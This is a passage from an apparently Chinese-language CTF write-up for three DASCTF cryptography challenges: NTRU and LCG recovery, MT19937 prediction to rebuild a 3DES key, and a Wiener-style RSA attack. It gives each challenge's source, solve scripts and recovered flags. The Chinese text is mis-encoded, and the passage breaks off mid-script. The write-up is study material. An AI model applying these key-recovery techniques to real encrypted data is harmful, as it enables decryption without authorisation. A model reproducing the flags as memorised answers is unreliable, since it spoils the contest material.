href="#Easy-3L" class="headerlink" title="Easy_3L"></a>Easy_3L</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    p = getPrime(<span class="number">1400</span>)</span><br><span class="line">    f = getRandomNBitInteger(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(f, q) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = (invert(f, p) * q) % p</span><br><span class="line">    <span class="keyword">return</span> p, h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">m</span>):</span><br><span class="line">    a = getPrime(<span class="number">250</span>)</span><br><span class="line">    b = getRandomNBitInteger(<span class="number">240</span>)</span><br><span class="line">    n = getPrime(<span class="number">512</span>)</span><br><span class="line">    seed = m</span><br><span class="line">    s = [<span class="number">0</span>] * <span class="number">6</span></span><br><span class="line">    s[<span class="number">0</span>] = seed</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        s[i] = (s[i - <span class="number">1</span>] * a + b) % n</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">msg, p, h</span>):</span><br><span class="line">    s = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">    c = (s * h + msg) % p</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = encrypt1(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S1 =&quot;</span>, s[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S2 =&quot;</span>, s[<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S4 =&quot;</span>, s[<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S5 =&quot;</span>, s[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">p, h = get_key()</span><br><span class="line">c = encrypt2(s[<span class="number">3</span>], p, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h =&quot;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># S1 = 28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span></span><br><span class="line"><span class="comment"># S2 = 1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span></span><br><span class="line"><span class="comment"># S4 = 9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span></span><br><span class="line"><span class="comment"># S5 = 9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span></span><br><span class="line"><span class="comment"># p = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span></span><br><span class="line"><span class="comment"># h = 2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span></span><br><span class="line"><span class="comment"># c = 20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p><code>encrypt1()</code> å’Œ <code>encrypt2()</code> åˆ†åˆ«æ˜¯LCGå’ŒNTRUã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">h = <span class="number">2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span></span><br><span class="line">p = <span class="number">25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span></span><br><span class="line">c = <span class="number">20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span></span><br><span class="line"></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f,g = -f,-g</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line"></span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"></span><br><span class="line">S1 = <span class="number">28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span></span><br><span class="line">S2 = <span class="number">1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span></span><br><span class="line">S4 = <span class="number">9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span></span><br><span class="line">S5 = <span class="number">9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span></span><br><span class="line">s = [S1,S2,m,S4,S5]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_modulus</span>(<span class="params">states</span>):</span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line">n, a, b = crack_unknown_modulus(s)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">seed = (S1-b)*inverse_mod(a,n)%n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(seed)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;NTRU_L0G_a6e_S1mpLe&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="SigninCrypto"><a href="#SigninCrypto" class="headerlink" title="SigninCrypto"></a>SigninCrypto</h3><blockquote><p>éšæœºæ•°çœŸéšæœºå—ï¼Ÿå¦‚éšï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> key</span><br><span class="line"><span class="keyword">from</span> iv <span class="keyword">import</span> iv</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">K1= key</span><br><span class="line">hint1 = os.urandom(<span class="number">2</span>) * <span class="number">8</span></span><br><span class="line">xor =bytes_to_long(hint1)^bytes_to_long(K1)</span><br><span class="line"><span class="built_in">print</span>(xor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Rand</span>():</span><br><span class="line">    rseed = secrets.randbits(<span class="number">1024</span>)</span><br><span class="line">    List1 = []</span><br><span class="line">    List2 = []</span><br><span class="line">    seed(rseed)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        rand16 = getrandbits(<span class="number">16</span>)</span><br><span class="line">        List1.append(rand16)</span><br><span class="line">    seed(rseed)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">        rand64 = getrandbits(<span class="number">64</span>)</span><br><span class="line">        List2.append(rand64)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;task.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> rand16 <span class="keyword">in</span> List1:</span><br><span class="line">            file.write(<span class="built_in">hex</span>(rand16)+ <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> rand64 <span class="keyword">in</span> List2:</span><br><span class="line">            file.write(<span class="built_in">hex</span>((rand64 &amp; <span class="number">0xffff</span>) | ((rand64 &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">16</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">Rand()</span><br><span class="line"></span><br><span class="line">K2 = long_to_bytes(getrandbits(<span class="number">64</span>))</span><br><span class="line">K3 = flag[:<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">KEY = K1 + K2 + K3</span><br><span class="line"></span><br><span class="line">IV=iv</span><br><span class="line"></span><br><span class="line">IV1=IV[:<span class="built_in">len</span>(IV)//<span class="number">2</span>]</span><br><span class="line">IV2=IV[<span class="built_in">len</span>(IV)//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">digest1 = hashlib.sha512(IV1).digest().<span class="built_in">hex</span>()</span><br><span class="line">digest2 = hashlib.sha512(IV2).digest().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">digest=digest1+digest2</span><br><span class="line">hint2=(bytes_to_long(IV)&lt;&lt;<span class="number">32</span>)^bytes_to_long(os.urandom(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bytes_to_long((digest.encode()))))</span><br><span class="line"><span class="built_in">print</span>(hint2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mode = DES3.MODE_CBC</span><br><span class="line">des3 = DES3.new(KEY, mode, IV)</span><br><span class="line"></span><br><span class="line">pad_len = <span class="number">8</span> - <span class="built_in">len</span>(flag) % <span class="number">8</span></span><br><span class="line">padding = <span class="built_in">bytes</span>([pad_len]) * pad_len</span><br><span class="line">flag += padding</span><br><span class="line"></span><br><span class="line">cipher = des3.encrypt(flag)</span><br><span class="line"></span><br><span class="line">ciphertext=cipher.<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 334648638865560142973669981316964458403</span></span><br><span class="line"><span class="comment"># 0x62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833</span></span><br><span class="line"><span class="comment"># 22078953819177294945130027344</span></span><br><span class="line"><span class="comment"># a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1</span></span><br></pre></td></tr></table></figure></blockquote><p>3DESåŠ å¯†ï¼Œkeyç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œ$K_1$ æ ¹æ®ä¸åŒä½æ•°å¼‚æˆ–å¾—åˆ°randomçš„ä¸¤ä¸ªå­—èŠ‚å€¼ï¼Œ$K_2$ åˆ©ç”¨MT19937ç®—æ³•è®¡ç®—è¾“å‡ºå€¼ï¼Œ$K_3$ ä¸ºflagå‰å…«ä½ï¼Œå³ <code>&#39;DASCTF&#123;&#39;+?</code>ï¼Œå…±éœ€çˆ†ç ´1ä¸ªå¯è§å­—ç¬¦ï¼›8å­—èŠ‚ivï¼Œç”±sha512ç»“æœçŸ¥å‰å4å­—èŠ‚ç›¸åŒï¼Œç”±hint2çŸ¥ï¼Œivå³ç§»4å­—èŠ‚åé”™ä½å¼‚æˆ–ï¼Œhint2é«˜4ä½å³ä¸º4å­—èŠ‚ivå€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s1 = [...]</span><br><span class="line">s2 = [...]</span><br><span class="line"></span><br><span class="line">predictor = MT19937Predictor()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">    x = (s1[<span class="number">2</span>*i+<span class="number">1</span>]&lt;&lt;<span class="number">48</span>) | ((s2[i]&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">32</span>) | (s1[<span class="number">2</span>*i]&lt;&lt;<span class="number">16</span>) | (s2[i]&amp;<span class="number">0xffff</span>)</span><br><span class="line">    predictor.setrandbits(x, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">K2 = long_to_bytes(predictor.getrandbits(<span class="number">64</span>))</span><br><span class="line"><span class="built_in">print</span>(K2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">d = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833&#x27;</span>)</span><br><span class="line">d1 = d[:<span class="number">128</span>]</span><br><span class="line">d2 = d[<span class="number">128</span>:]</span><br><span class="line"><span class="built_in">print</span>(d1)</span><br><span class="line"><span class="built_in">print</span>(d2)</span><br><span class="line"><span class="built_in">print</span>(d1==d2)</span><br><span class="line"></span><br><span class="line">xor = <span class="number">334648638865560142973669981316964458403</span></span><br><span class="line">hint2 = <span class="number">22078953819177294945130027344</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">hint1 = bytes_to_long(long_to_bytes(xor&gt;&gt;<span class="number">112</span>)*<span class="number">8</span>)</span><br><span class="line">K1 = long_to_bytes(hint1 ^ xor)</span><br><span class="line"><span class="built_in">print</span>(K1)</span><br><span class="line"></span><br><span class="line">iv = hint2&gt;&gt;(<span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">IV = long_to_bytes(iv)*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(IV)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k3 <span class="keyword">in</span> trange(<span class="number">128</span>):</span><br><span class="line">    K3 = <span class="string">b&#x27;DASCTF&#123;&#x27;</span>+<span class="built_in">bytes</span>([k3])</span><br><span class="line">    KEY = K1 + K2 + K3</span><br><span class="line">    des3 = DES3.new(KEY, DES3.MODE_CBC, IV)</span><br><span class="line">    m = des3.decrypt(c)</span><br><span class="line">    <span class="keyword">if</span> m.startswith(<span class="string">b&#x27;DASCTF&#123;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;8e5ee461-f4e1-4af2-8632-c9d62f4dc073&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="esyRSA"><a href="#esyRSA" class="headerlink" title="esyRSA"></a>esyRSA</h3><blockquote><p>å¥½åƒè¿™ä¸ªRSAæœ‰ç‚¹æ€ªå•Šï¼ç§é’¥ç»™ä½ äº†ï¼æˆ‘çš„eå‘¢ï¼Ÿ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> md5 <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> p, q</span><br><span class="line"></span><br><span class="line">e = ?????</span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">ans = gcd(e,phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> n, e, d</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Flag: DASCTF&#123;%s&#125;&quot;</span> %md5(<span class="built_in">str</span>(p + q)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 8064259277274639864655809758868795854117113170423331934498023294296505063511386001711751916634810056911517464467899780578338013011453082479880809823762824723657495915284790349150975180933698827382368698861967973964030509129133021116919437755292590841218316278732797712538885232908975173746394816520256585937380642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span></span><br><span class="line"><span class="string">d = 14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$n$ ç›´æ¥ç»™å¾—æœ‰é—®é¢˜ï¼Œé‡å¤äº†ä¸€éï¼Œå·¨å‘ã€‚</p><p>æ­£ç¡®çš„ $n=$80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</p><p>$n$ ä¸ $d$ ä½æ•°ç›¸è¿‘ï¼Œ$e$ å¾ˆå°ï¼ŒWiener Attack /çˆ†ç ´/æ±‚ $e$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">d = </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="comment"># Converts a rational x/y fraction into a list of partial quotients [a0, ..., an]</span></span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span 